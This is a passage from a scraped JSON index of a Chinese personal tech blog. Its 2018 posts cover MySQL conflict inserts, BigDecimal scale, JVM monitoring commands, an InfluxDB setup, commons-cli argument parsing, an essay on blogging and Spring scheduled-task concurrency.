Into方式如果在批量插入中，存在冲突时，我希望用我的新数据替换旧的数据，这个时候就可以使用replace into了 常用姿势如下 12345replace into `user` (`id`, `name`, `create_at`, `update_at`) values (1, 'test', '2018-07-10 18:54:00', '2018-07-10 19:54:52'), (2, 'test2', '2018-07-10 18:54:00', '2018-07-10 19:54:52'), (3, 'test3', '2018-07-10 18:54:00', '2018-07-10 19:54:52'); 执行截图如下，注意红框中，当某条记录冲突之后并修改，则影响行数为2, 其实际过程是 删除冲突数据 插入新的数据 3. ON DUPLICATE KEY UPDATE在出现冲突时，希望更新某些数据，这个时候就可以在insert语句的最后加上on duplicate key update了 实例如下 1insert into `user` (`id`, `name`, `create_at`, `update_at`) values (1, 'test0', '2018-07-10 18:54:00', '2018-07-10 18:54:52') ON DUPLICATE KEY UPDATE `update_at`='2018-07-10 19:58:05'; 执行截图如下，这个是在原记录的基础上执行更新指定的value, 比如上面的插入中，当冲突时，我们只更新update_at字段，而name的test0没有更新 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/10/180710-MySql插入唯一键冲突的三种可选方式/"},{"title":"180706-BigDecimal除法的精度问题","text":"BigDecimal除法的精度问题在使用BigDecimal的除法时，遇到一个鬼畜的问题，本以为的精度计算，结果使用返回0，当然最终发现还是自己的使用姿势不对导致的，因此记录一下，避免后面重蹈覆辙 I. 问题抛出在使用BigDecimal做高精度的除法时，一不注意遇到了一个小问题，如下 123456789101112131415161718@Testpublic void testBigDecimal() { BigDecimal origin = new BigDecimal(541253); BigDecimal now = new BigDecimal(12389431); BigDecimal val = origin.divide(now, RoundingMode.HALF_UP); System.out.println(val); origin = new BigDecimal(541253); now = new BigDecimal(12389431.3); val = origin.divide(now, RoundingMode.HALF_UP); System.out.println(val); origin = new BigDecimal(541253.4); now = new BigDecimal(12389431); val = origin.divide(now, RoundingMode.HALF_UP); System.out.println(val);} 上面的输出是什么 ？ 123000.043686703610520937021487456961257 为什么前面两个会是0呢，如果直接是 541253 / 12389431 = 0 倒是可以理解, 但是BigDecimal不是高精度的计算么，讲道理不应该不会出现这种整除的问题吧 我们知道在BigDecimal做触发时，可以指定保留小数的参数，如果加上这个，是否会不一样呢？ 12345BigDecimal origin = new BigDecimal(541253);BigDecimal now = new BigDecimal(12389431);BigDecimal val = origin.divide(now, 5, RoundingMode.HALF_UP);System.out.println(val); 输出结果为: 10.04369 所以说在指定了保留小数之后，则没有问题，所以大胆的猜测一下，是不是上面的几种case中，由于scale值没有指定时，默认值不一样，从而导致最终结果的精度不同呢？ 简单的深入源码分析一下，执行的方式为 origin.divide(now, RoundingMode.HALF_UP);, 所以这个scale参数就瞄准origin对象，而这个对象，就只能去分析它的构造了，因为没有其他的地方使用 II. 源码定位1. 整形传参构造分析下面这一行， 直接进入源码 1BigDecimal origin = new BigDecimal(541253); 很明显的int传参构造，进去简单看一下 123456789101112// java.math.BigDecimal#BigDecimal(int)public BigDecimal(int val) { this.intCompact = val; this.scale = 0; this.intVal = null;}public BigDecimal(long val) { this.intCompact = val; this.intVal = (val == INFLATED) ? INFLATED_BIGINT : null; this.scale = 0;} so，很明确的知道默认的scale为0，也就是说当origin为正数时，以它进行的除法，不现实指定scale参数时，最终返回的都是没有小数的，同样看一眼，还有long的传参方式， BigInteger也一样 2. 浮点传参接下来就是浮点的scale默认值确认了，这个构造相比前面的复杂一点，源码就不贴了，太长，也看不太懂做了些啥，直接用猥琐一点的方式，进入debug模式，单步执行 123456@Testpublic void testBigDecimal() { BigDecimal origin = new BigDecimal(541253.0); BigDecimal now = new BigDecimal(12389431.1); BigDecimal tmp = new BigDecimal(0.0);} 根据debug的结果，第一个，scale为0； 第二个scale为29, 第三个scale为0 3. String传参依然是一大串的逻辑，同样采用单步debug的方式试下 123456@Testpublic void testBigDecimal() { BigDecimal origin = new BigDecimal(\"541253.0\"); BigDecimal now = new BigDecimal(\"12389431.1\"); BigDecimal t = new BigDecimal(\"0.0\");} 上面三个的scale都是1 4. 小结 对于BigDecimal进行除法运算时，最好指定其scale参数，不然可能会有坑 对于BigDecimla的scale初始化的原理，有待深入看下BigDecimal是怎么实现的 最后贴一张乘法的图作为收尾 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/06/180706-BigDecimal除法的精度问题/"},{"title":"180716-Centos时区设置","text":"使用timedatectl命令同步时间并设置时区 I. timedatactl命令1. 使用帮助1timedatectl -h 2. 命令示例2.1 显示系统的当前时间和日期123timedatectl# timedatectl status# 两条命令效果等同 2.2 设置日期与时间123timedatectl set-time \"YYYY-MM-DD HH:MM:SS\"timedatectl set-time \"YYYY-MM-DD\"timedatectl set-time \"HH:MM:SS\" 2.3 查看所有可用的时区123timedatectl list-timezones# 亚洲timedatectl list-timezones | grep -E \"Asia/S.*\" 2.4.设置时区1timedatectl set-timezone Asia/Shanghai 2.5.设置硬件时间1234# 硬件时间默认为UTCtimedatectl set-local-rtc 1# hwclock --systohc --localtime# 两条命令效果等同 2.6.启用时间同步12timedatectl set-ntp yes# yes或no; 1或0也可以 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/16/180716-Centos时区设置/"},{"title":"180711-JVM定位分析CPU性能消耗","text":"JVM分析CPU性能消耗分三步走，看下JVM中的线程占用的CPU资源，以及定位这些线程为什么如此消耗资源 I. 分析三板斧1. 获取JVM进程号使用top方式查看进程号 12top// 按c显示详情 使用jps方式查看 1jps -l 2. 查看进程中不同线程对CPU的资源消耗1top -Hp 进程号 获取其中占用CPU资源较多的几个线程PID, 转16进制，可以使用shell命令如 1printf \"%x\\n\" 4485 3. jstack分析线程1jstack 进程号 1&gt; xxx.tmp 进入tmp文件，然后根据前面计算的十六进制，定位到具体的线程 II. 其他0. 参考 JVM CPU高负载的排查办法 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/11/180711-JVM定位分析CPU性能消耗/"},{"title":"180704-JDK常用监控参数","text":"相关博文: jvm调优的工具介绍 小结一下用的几个调优参数，特别是自带的jvisualvm,比较好用，但是功能丰富完整方面比jprofile要欠缺一点，后面有时间补上jprofile的使用过程 I. 调优工具0. 性能查看对于需要查看应用占系统的CPU，内存等资源，可以使用top命令 1top 因为too现实的进程号相关，可以按 c 现实详细的进程信息 1.查看内存占用情况1jmap -histo 24175 1&gt; test.log 2. gc情况查看1jstat -gcutil 9727 1000 20 3. 生成dump文件首先查询对应的进程号，然后根据jmap来生成dump文件 12jps -ljmap -dump:format=b,file=tmp.hprof 23517 4. 远程jvisualvm对应jar包启动命令，添加下面的参数 1nohup java -Djava.rmi.server.hostname=127.0.0.1 -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=1099 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -jar test.jar \"$@\" &gt; /dev/null 2&gt;&amp;1 &amp; 然后再控制台输入 1jvisualvm 然后再弹出的页面添加远程连接即可 4. jprofilejar启动时，添加参数 1-agentpath:/home/finbtc/soft/jprofiler10.1.2/bin/linux-x64/libjprofilerti.so=port=8849,no-wait 相关使用说明，待完善 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/04/180704-JDK常用监控参数/"},{"title":"180717-借助Maven打包可项目执行的Jar小记","text":"当我们希望项目打包为一个可执行的jar文件，丢到服务器上运行时，可以怎么做？借助maven。可以比较简单的实现这个 I. 使用小结在pmo依赖文件中，添加下面的依赖 12345678910111213141516171819202122232425262728&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;appendAssemblyId&gt;false&lt;/appendAssemblyId&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.git.hui.task.AppLaunch&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assembly&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;assembly&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 注意上面的mainClass标签中，指定的是main方法执行入口，上面这种打包方式，会将所有依赖的第三方包，也一同打包到最终生成的jar文件中 即，这个jar文件，包含了所有的依赖和业务代码，可以直接运行，执行方式 1java -jar xxx.jar 源码验证case： https://github.com/liuyueyi/quick-task II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/17/180717-借助Maven打包可项目执行的Jar小记/"},{"title":"180724-统计JVM进程中线程数两种方式小记","text":"I. 统计进程中的线程数相关系列博文推荐: 180711-JVM定位分析CPU性能消耗 180704-JDK常用监控参数 jvm调优的工具介绍 1. proc查询 /proc 目录以可读文本文件形式输出，提供现有进程和系统硬件相关的信息如 CPU、中断、内存、磁盘等等 查看状态命令 1cat /proc/进程号/status 其中对应的线程数为 Threads: 367 这一行 另外一种方式就是直接查看 /proc/进程号/task 下的目录，每个线程对应一个目录，目录名为对应的线程ID 1ls /proc/进程号/task | wc -l 2. ps命令1ps -hH 进程号 | wc -l 列出了由进程号为的进程创建的所有线程 1ps -T 进程号 3. pstree 命令1pstree -p xxx | wc -l II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注小灰灰Blog&amp;公众号 知识星球","link":"/hexblog/2018/07/24/180724-统计JVM进程中线程数两种方式小记/"},{"title":"180725-InfluxDB-v1.6.0安装和简单使用小结","text":"InfluxDB安装和简单使用小结InfluxDB是一个时序性数据库，因为工作需求，安装后使用测试下是否支持大数据下的业务场景 说明： 安装最新版本 v1.6.0 集群版本要收费，单机版本免费 内部集成的web控制台被ko掉了 I. 安装直接到官网，查询对应的下载安装方式 Installing InfluxDB OSS 安装方式 123SHA256: fa118d657151b6de7c79592cf7516b3d9fada813262d5ebe16516f5c0bf62039wget https://dl.influxdata.com/influxdb/releases/influxdb-1.6.0.x86_64.rpmsudo yum localinstall influxdb-1.6.0.x86_64.rpm 服务启动命令 1234# 启动命令service influxdb start# 关闭命令service influxdb stop 注意 默认占用8086/8088两个端口号，可以根据自己的实际场景进行替换，进入配置文件 /etc/influxdb/influxdb.conf 查询 bind-address，其中端口号对应的用处说明如下 1234567891011# Bind address to use for the RPC service for backup and restore.bind-address = &quot;127.0.0.1:8088&quot;...[http] # Determines whether HTTP endpoint is enabled. # enabled = true # The bind address used by the HTTP service. bind-address = &quot;:8086&quot; II. 控制台简单使用influx提供了一个控制台进行简单的操作，下面给出基本的使用姿势，对于influxdb的一些概念性问题，放在下一篇专门给与说明 首先进入控制台 1234influx# 如果修改了端口号，则需要显示指定# influx -port xxx 1. database相关这个数据库和我们平常接触比较多的mysql中的数据库差不多，使用姿势也相差无几 a. 显示所有的数据库说明： &gt;后面跟的是命令，后面的是输出结果 123456&gt; show databasesname: databasesname----_internalhh_test b. 创建数据库和mysql语法一致， create database xxx 12345678&gt; create database mytest&gt; show databasesname: databasesname----_internalhh_testmytest c. 删除数据库使用drop进行删除，drop database xxx 1234567&gt; drop database mytest&gt; show databasesname: databasesname----_internalhh_test d. 选择数据库12&gt; use hh_testUsing database hh_test 2. 表相关在influxDB中，表不是我们传统理解的table，在这里，专业术语叫做 measurement (度量？） 查看所有的measurement的命令 12345show measurements;name: measurementsname----trade 不同于mysql，没有提供专门的创建表，新插入数据，就会自动创建一个不存在的表 1. 新增数据1insert &lt;tbname&gt;,&lt;tags&gt; &lt;values&gt; [timestamp] 说明： tbname : 数据表名称 tags : 表的tag域 values : 表的value域 timestamp ：当前数据的时间戳（可选，没有提供的话系统会自带添加） 1234567&gt; insert students,addr=wuhan phone=124&gt; select * from studentsname: studentstime addr phone---- ---- -----1532514647456815845 wuhan 124 2. 查询查询和sql类似，基本结构如下，但是有很多的限制，后面详解 1select * from table where condition group by xxx order by time asc limit 10 一个实例case 12345678910111213141516&gt; insert students,addr=wuhan phone=124&gt; insert students,addr=wuhan phone=123&gt; insert students,addr=changsha phone=15&gt; select * from students where phone&gt;0 group by addr order by time desc limit 10;name: studentstags: addr=wuhantime phone---- -----1532515056470523491 1231532515052664001894 124name: studentstags: addr=changshatime phone---- -----1532515064351295620 15 3. 更新与删除当需要更新一个记录时，直接覆盖一个时间戳+所有的tag相等的即可 123456789101112131415&gt; select * from studentsname: studentstime addr phone---- ---- -----1532515052664001894 wuhan 1241532515056470523491 wuhan 1231532515064351295620 changsha 15&gt; insert students,addr=wuhan phone=111123 1532515052664001894&gt; select * from studentsname: studentstime addr phone---- ---- -----1532515052664001894 wuhan 1111231532515056470523491 wuhan 1231532515064351295620 changsha 15 删除一条记录，用delete命令 12345678910111213&gt; select * from studentsname: studentstime addr phone---- ---- -----1532515052664001894 wuhan 1111231532515056470523491 changsha 1231532515056470523491 wuhan 123&gt; delete from students where time=1532515056470523491&gt; select * from studentsname: studentstime addr phone---- ---- -----1532515052664001894 wuhan 111123 4. 删除表1drop measurement students III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/07/25/180725-InfluxDB-v1.6.0安装和简单使用小结/"},{"title":"180718-jar包执行传参使用小结","text":"jar包执行时传参的使用姿势虽说我们现在大多不太直接使用jar包运行方式，目前比较主流的是将自己的服务丢在某个容器中（如tomcat，jetty等）运行，比如我之前所属的电商公司，就是将项目打包为war包，丢到tomcat容器中运行的 在使用SpringBoot时，可能会出现直接打包一个可执行的jar，然后运行，这种时候，通过java命令执行时，时可以传参的，那么问题来了，main方法可以如何优雅的解析这些传参呢？ I. 简陋版本最容易想到的，无非是自己直接解析main方法的传参，如我们知道的main方法的一般写法为 12public static void main(String[] args) {} 看到上面的写法，很容易就可以猜到，传入的参数最终都放到了args数组中，那么该怎么用就怎么用，一个hello world的实例如下 123public static void main(String[] args) { System.out.println(\"hello \" + args[0]);} 测试如下： 看到这里，真心感觉没有什么干货，上面这些过于小白了吧，估计连入门都算不上，那么参数处理仅止于此么？ II. 进阶版本玩过shell的同学应该都知道man命令，可以用来查看很多shell命令的帮助，里面介绍了很多的shell命令的参数说明，而且这些参数一般有缩写和全拼，而且有些参数可以带传值，有些并不需要，可以说shell命令的传参方式，已经拥有自己独立的一套规范了，而且用起来非常的爽 那么我们的jar包，能否支持这种传参方式呢？ 举一个简单的例子，上面的HelloWord接收一个简单用户名参数 不传入时，默认输出 hello world 短参方式: -n xxx 长参方式: --name=xxx 仅仅支持这一个场景，需要自己来解析的话，就得写一长串的代码，好在这种需求已经有轮子了 1. commons-cli首先引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;commons-cli&lt;/groupId&gt; &lt;artifactId&gt;commons-cli&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt; 开始使用，官网已经给出了例子，完整的doc可以参考 commons-cli Usage Scenarios 2. 实例演示下面结合我的一个项目，给出实际的使用方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Slf4jpublic class AppLaunch { private static final String SOURCE_PATH = \"./task-core/src/test/java/com/git/hui/task\"; private static final String TASK_ARG_LONG = \"task\"; private static final String TASK_ARG_SHORT = \"t\"; private static final String ARG_HELP_LONG = \"help\"; private static final String ARG_HELP_SHORT = \"h\"; private static volatile boolean run = true; private static void printHelp() { Options options = buildOptions(); HelpFormatter helpFormatter = new HelpFormatter(); helpFormatter.printHelp(\"java -jar ${jar} [options]\", options); } private static Options buildOptions() { Options options = new Options(); options.addOption( Option.builder(TASK_ARG_SHORT).argName(TASK_ARG_LONG).hasArg().longOpt(TASK_ARG_LONG).required(false) .desc(\"choose task path, default [\" + SOURCE_PATH + \"]\").build()); options.addOption(Option.builder(ARG_HELP_SHORT).longOpt(ARG_HELP_LONG).desc(\"show command help\").build()); return options; } private static CommandLine parseArguments(String[] arguments) { Options options = buildOptions(); CommandLine commandLine = null; try { commandLine = new DefaultParser().parse(options, arguments); } catch (ParseException e) { e.printStackTrace(); System.exit(1); } if (commandLine.hasOption(ARG_HELP_LONG)) { printHelp(); System.exit(0); } return commandLine; } public static void main(String[] args) throws InterruptedException { CommandLine commandLine = parseArguments(args); String scriptSource = commandLine.getOptionValue(TASK_ARG_LONG, SOURCE_PATH); System.out.println(\"script source: {}\" + scriptSource); // .... }} 对上面的使用姿势进行简单的说明，从逻辑上划分，可以分为下面几块 定义传参，包括参数说明，缩写和全拼，是否有参数值，描述等 解析传参数组，将具体的传参解析为CommandLine对象 获取参数，执行相应的业务逻辑 从源码角度来看，没什么复杂或者难以理解的地方，稍稍提一点，参数的定义，即buildOption方法中，上面指定了两个参数 help, task, 其中一个要求有参数值，一个不需要参数值，下面实际演示如下 III. 其他0. 相关信息 文档： commons-cli 使用手册 实际项目：https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/18/180718-jar包执行传参使用小结/"},{"title":"180731-关于写作的一点杂谈","text":"晚上吃了顿烧烤，回来之后就比较晚了，今天的工作小结却没有啥好东西可以写，修了一天的数据，加了点业务逻辑的if/else，也确实没有什么特别值得说到的事情。索性就写一写从去年四五月份开始，到现在一直在坚持的写博文。 先来一张庐山三叠泉排个版 还记得是去年年后上班，当时工作并不算特别忙碌，业余时间多了些，就想着能有些沉淀和积累，特别是当身边有很多特别厉害得大牛，感觉他们啥都知道，而自己依然还处于业务层面的if/else逻辑的搬运上，就给自己定了个小目标，每周至少写一篇博文。最开始在开源中国上安家，翻了一下记录，差不多是17年三四月的样子，最开始不知道写什么，也不知道怎么去写，看了下最开始的博文，基本上就是各种的贴代码，没啥描述说明，比较粗暴；当然现在也不见得有多大的长进，但至少有了一个明确的出发点，就是希望输出一个东西的时候，能把自己对这个东西的理解从头到尾的叙述清楚，尽量让小白级的盆友也可以没什么压力（理想与现实差距目前看来还是很明显的） 看了下以前的博文历史，发现主题还是明朗的，最开始不知道写什么东西的时候，就跑过去看jdk源码，分析常用的容器类，写完之后不敢说对使用的容器的实现原理能一清二楚，但大致的思路，以及每个容器的适用场景和优雅的适用姿势却有了不小的认识，当然这一块看完之后，最大的收获就是在以后准备面试时，这些基础相关的东西可以很快的就捡起来，基于理解的记忆远优于基于背诵的记忆 另外一块比较多的是与线程相关的知识点了，即使到现在，对并发编程这一块，依然感觉使用起来不算难，但想玩得溜就不太简单了。最近遇到了不少关于线程方面的调优问题，每次分析这个脑袋都是大的，任重而道远的一项工作。关于这一块，真心的感觉是，如果纯粹的做业务开发，或许并不怎么需要或者用得到多线程，但是涉及到更底层一些的框架设计或者大数据量的计算调优时，多线程的使用时逃不掉。要想能熟练的使用，最好的方式就是先产出几篇ExecutorService和ForkJoin的使用博文，然后就不可避免的进入jvm的监控和调优的常用命令(jstat,jmap,jstack)… 一谈到多线程，感觉就收不住了，不继续展开，后面等解决了目前遇到的一个扎手的问题之后，单独的开一篇记录下 还有一块比较多的就是几个开源项目的设计与技术文档了，目前被关注的比较多的一个是Quick-Media一个就是Quick-Alarm。前面的一个项目主要诞生的原因就是因为之前负责的一个超级边缘的业务，没有产品，没有运营，负责人也就我一个，再加上这个东西与公司的主流业务偏离过于遥远（电商公司，这个服务主要是图片、音频、二维码等多媒体处理）。主导这个项目之后，为了让它能有更多的活力，至少要让大家知道它的存在，所以想了很多奇奇怪怪的功能点，当然也因为实在是没有业务方来用，所以怎么办呢？索性自己开了个坑，把自己想到的各种非主流的功能点利用业务时间给实现掉，所以就写了这个工程。当然在写这个项目的过程中，就诞生了一系列的多媒体相关的博文了，虽然没有特别深入，至少在使用的层面来讲，还是不错的 上面的废话有点多了，其实仅仅是上面的这些东西的话，可以写的东西虽然说并不少，但一直坚持下去，也不太容易。特别是人都有懒惰的心里，拖延症一发，可能整个就崩掉了。 18年4月之后，回了武汉，休息了差不多一个月，闲下来之后，就有点慌了，特别是对自己的实力认知，忽然发现之前工作的几年，好像并没有特别深的积累，很多东西都浮于表面，至少对于那些经典的框架mybaits,spring,logback,netty这些，都没有去看源码，对于常用的一些开源库dubbo,spring-cloud,druid等也没用过，而自己用顺手的一些东西呢，又都是上一家公司的内部中间件，因此心虚的不行。当时就给自己定了个小目标，再工作中遇到的东西都总结沉淀下来，每天都能学一点不一样的东西，充实下自己，这样也能督促自己在遇到一个问题时，不得不深入进去，研究下为什么会这样，不然这个每日小结就写不了… 到现在，也差不多坚持了两个月了，其实是挺难坚持的，如果某天事情多了点，加加班，回到家十点多，基本上就不太想再写东西了😭，对此也没啥好说的，继续坚持吧 本来写这个主要是为了表达下在这一段时间里，写了这么多博文，有什么收获和感想，结果上面成了前一段时间的博文小结，有些跑题了。下面强制的拉回来 写作是一个坚持的过程，可能没有多少的人看你写的东西（对于我而言，确实是没有什么多少人看），但写作的过程，对自己而言，是有很大的收获的。因为在写一个东西的时候，可以很清晰的知道，自己对这个东西是不是真的理解了（即便你当时的理解是有问题的，因为不同的技术积累，看待问题的程度不一样，可能导致不一样的结果），因为在你拿不准的时候，在书写的过程中，你压根写不出来，除非是直接复制粘贴别人的东西 另外一个收获就是发现我个人完全没有推广的潜力，为了让我写的东西能让更多的人看到，尝试了不少的手段，什么公众号，百家号之类的，啥都凑上去弄了一下，各种技术博文的分享论坛或网站上，都注册了账号，反正一篇博文到处发，结果当然也是寥寥。感觉还是seo的经验不够，这整个过程中，感觉唯一的收获就是捣鼓了一个个人博客网站，拿了一个别人的主题，修修改改差不多达到预期中的样式（改样式对一个纯后端而言，真心是个艰难的过程） 最后说一下这一年多的时间，写了这么些博文，虽然对别人而言，价值不大，但对自己而言，每次看着总篇数一天天增加，有一种别样的收获感。点赞、收藏和评论其实挺能给作者一种愉悦感觉的，当然我个人其实挺不喜欢收藏的，因为收藏的文章最终基本上不会有机会再翻出来重新的看一遍，最好的结果就是看完之后能完整的get到文章的要点，有不明白的直接跟帖搞清楚，吃透之后，这篇文章完全可以扔掉了，毕竟收藏夹里的一百篇文章都不如自己脑子里的一篇文章 随便写了点东西，居然都十一点多了，结束话题，关闭电脑睡觉，最后感慨一句，无比羡慕有暑假的孩子，这38度的高温，上什么班，学什么习，就应该躺在家里吃着西瓜，吹着空调玩手机啊 最后来个鄱阳湖收个尾，额外说一句上周去的庐山真心是避暑好地 我是一灰灰，有兴趣的可以一起聊个几毛钱的 一灰灰blog 知识星球","link":"/hexblog/2018/07/31/180731-关于写作的一点杂谈/"},{"title":"180803-Spring定时任务高级使用篇","text":"前面一篇博文 《Spring之定时任务基本使用篇》 介绍了Spring环境下，定时任务的简单使用姿势，也留了一些问题，这一篇则希望能针对这些问题给个答案 I. 定时任务进阶篇1. 问题小结前面一篇博文，抛出了下面的几个问题，接下来则围绕问题进行分析 一个项目中有多个定时任务时，他们是并行执行的还是串行执行的？ 如果默认是串行的 那么有相同的crond表达式的定时任务之间，有先后顺序么？ 某个任务的阻塞是否会影响后面的任务？ 如果需要他们并行执行，可以怎么做？ 如果是并发执行的 是新创建线程还是采用线程池来复用呢？ 在并发执行时，假设有个每秒执行一次的任务，但是它执行一次消耗的时间大于1s时，这个任务的表现时怎样的呢？不断地新增线程来执行还是等执行完毕之后再执行下一次的呢? 2. 多定时任务的串并行分析如何确认一个项目中的多个定时任务是串行执行还是并发执行呢？要想验证这个功能，最好的法子就是写个testcase，比如定义两个定时任务，在其中一个任务中写个死循环，看另外一个任务是否会正常执行 123456789101112@Scheduled(cron = \"0/1 * * * * ?\")public void sc1() throws InterruptedException { System.out.println(Thread.currentThread().getName() + \" | sc1 \" + System.currentTimeMillis()); while (true) { Thread.sleep(5000); }}@Scheduled(cron = \"0/1 * * * * ?\")public void sc2() { System.out.println(Thread.currentThread().getName() + \" | sc2 \" + System.currentTimeMillis());} 首先我们分析的是 sc1和sc2这两个任务的执行是串行还是并行的，暂时先不考虑 sc1 调用时阻塞，下一秒是否是开新的线程再调用sc1 若串行：则sc1打印一次，sc2可能打印0或者1次 若并行：sc1打印一次，sc2打印n多次 实际运行，GIF图演示如下 上图的结果，印证了默认的情况下，多个定时任务时串行执行的；如果一个任务出现阻塞，其他的任务都会受到影响 3. 定时任务执行的优先级既然是顺序执行的，那么优先级怎么定？每次都是固定的，还是随机的呢？ 要验证上面的方法，也容易，同样两个任务，看他们的输出是否会乱掉，如果每次都是任务1打印完再打印任务2，那就是固定优先级的；否则每次调度时，顺序不好说 测试代码如下 123456789@Scheduled(cron = \"0/1 * * * * ?\")public void sc1() { System.out.println(Thread.currentThread().getName() + \" | sc1 \" + System.currentTimeMillis());}@Scheduled(cron = \"0/1 * * * * ?\")public void sc2() { System.out.println(Thread.currentThread().getName() + \" | sc2 \" + System.currentTimeMillis());} 实测结果如下 从输出得出结论：顺序是串掉的，并没有表现出明显的优先级关系 4. 并行调度接下来的问题就是我希望这些任务可以并发执行，可以实现么？ 当然是可以，用起来也比较简单，首先是在Application上添加注解@EnableAsync，开启异步调用，然后再计划任务上加上@Async注解即可，一个简单的demo如下 123456789101112131415@EnableAsync@EnableScheduling@SpringBootApplicationpublic class QuickMediaApplication { public static void main(String[] args) { SpringApplication.run(QuickMediaApplication.class, args); } @Scheduled(cron = \"0/1 * * * * ?\") @Async public void sc1() { System.out.println(Thread.currentThread().getName() + \" | sc1 \" + System.currentTimeMillis()); }} 上面执行之后，查看输出（异步调度时，理论上线程名应该不一样) 从上面的输出，可以简单的推理，每次调度上面的任务都是新开了一个线程来做的，所以如果在定时任务中写了死循环，是否会导致无限线程，最后整个进程崩掉？ 额外提一句，linux系统下单进程的线程数是有上线的，查看命令为： 1ulimit -u 在测试之前，先看下上面的正常任务执行，如下面的动图，线程数并没有夸张的长法 接下来换成死循环的调度方式，实际测试如下，线程数蹭蹭的上涨 所以使用默认的异步调用方式，并不是一个好注意，说不准就被玩死了自己都不知道，那么可以用自己的线程池来管理这些异步任务么？ 5. 自定义线程池用自定义的线程池来取代默认线程管理方式，无疑是一个更加安全和灵活的方式，使用起来也并不麻烦，和平常创建线程池的套路没什么区别，要在Spring生态中使用，就把它搞成bean即可 直接借助Spring的线程池ThreadPoolTaskExecutor 12345678910111213141516171819@Beanpublic AsyncTaskExecutor asyncTaskExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); executor.setThreadNamePrefix(\"yhh-schedule-\"); executor.setMaxPoolSize(10); executor.setCorePoolSize(3); executor.setQueueCapacity(0); executor.setRejectedExecutionHandler(new ThreadPoolExecutor.AbortPolicy()); return executor;}@Scheduled(cron = \"0/1 * * * * ?\")@Asyncpublic void sc1() throws InterruptedException { System.out.println(Thread.currentThread().getName() + \" | sc1 \" + System.currentTimeMillis()); while (true) { Thread.sleep(1000 * 5); }} 实际演示的结果如下，最多10个线程，再提交的任务直接丢弃 